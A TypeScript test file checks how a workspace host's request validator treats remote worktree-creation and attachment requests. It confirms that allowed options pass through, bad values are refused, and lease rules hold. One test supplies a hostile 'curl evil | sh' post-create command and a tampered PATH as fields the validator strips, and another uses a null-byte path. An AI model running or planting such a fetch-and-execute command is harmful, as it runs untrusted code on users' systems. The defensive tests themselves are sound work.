import { describe, expect, it } from "vitest";
import { checkRemoteWorktreePortRequest, requiresDriving } from "../requestSchema.js";

const ROOT = "/repos/project-a";

function create(options: Record<string, unknown>) {
  return checkRemoteWorktreePortRequest(
    { id: "c-1", action: "create-worktree", payload: { rootPath: ROOT, options } },
    ROOT
  );
}

describe("remote create-worktree options", () => {
  it("forwards every declared option unchanged", () => {
    const options = {
      baseBranch: "main",
      newBranch: "feature/x",
      path: "/repos/project-a-x",
      fromRemote: true,
      useExistingBranch: false,
      provisionResource: true,
      worktreeMode: "docker",
      sourcePrNumber: 12,
      sourcePrTitle: "Fix things",
      sourcePrUrl: "https://example.com/pr/12",
      sourcePrState: "open",
      sourcePrLinkedIssueNumber: 7,
      submoduleInit: "all",
      collisionPolicy: "error",
    };
    const result = create(options);
    expect(result).toEqual({
      ok: true,
      request: {
        id: "c-1",
        action: "create-worktree",
        payload: { rootPath: ROOT, options },
      },
    });
  });

  it("strips fields the workspace host does not take from a remote sender", () => {
    const result = create({
      baseBranch: "main",
      newBranch: "x",
      path: "/tmp/x",
      env: { PATH: "/evil" },
      postCreateCommand: "curl evil | sh",
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const payload = result.request.payload as { options: Record<string, unknown> };
    expect(Object.keys(payload.options).sort()).toEqual(["baseBranch", "newBranch", "path"]);
  });

  it.each([
    ["an unknown submodule policy", { submoduleInit: "recursive" }],
    ["an unknown collision policy", { collisionPolicy: "overwrite" }],
    ["a mistyped flag", { fromRemote: "yes" }],
    ["a null byte in the path", { path: "/tmp/x\u0000y" }],
  ])("refuses %s", (_label, override) => {
    const result = create({ baseBranch: "main", newBranch: "x", path: "/tmp/x", ...override });
    expect(result).toEqual({ ok: false, id: "c-1", error: "Invalid payload for create-worktree" });
  });
});

describe("remote attachment-action", () => {
  function attachment(payload: unknown) {
    return checkRemoteWorktreePortRequest(
      { id: "a-1", action: "attachment-action", payload },
      ROOT
    );
  }

  it("forwards a well-formed request", () => {
    const payload = { worktreeId: "/repos/project-a-x", name: "tunnel", action: "attach" };
    expect(attachment(payload)).toEqual({
      ok: true,
      request: { id: "a-1", action: "attachment-action", payload },
    });
  });

  it.each([
    ["an unknown action", { worktreeId: "/w", name: "tunnel", action: "steal" }],
    ["an empty name", { worktreeId: "/w", name: "", action: "attach" }],
    ["a missing worktree", { name: "tunnel", action: "attach" }],
  ])("refuses %s", (_label, payload) => {
    expect(attachment(payload).ok).toBe(false);
  });

  it("needs the lease to move or detach, but not to check status", () => {
    const drives = (action: string) =>
      requiresDriving({
        action: "attachment-action",
        payload: { worktreeId: "/w", name: "tunnel", action },
      });
    expect(drives("attach")).toBe(true);
    expect(drives("detach")).toBe(true);
    expect(drives("status")).toBe(false);
  });
});
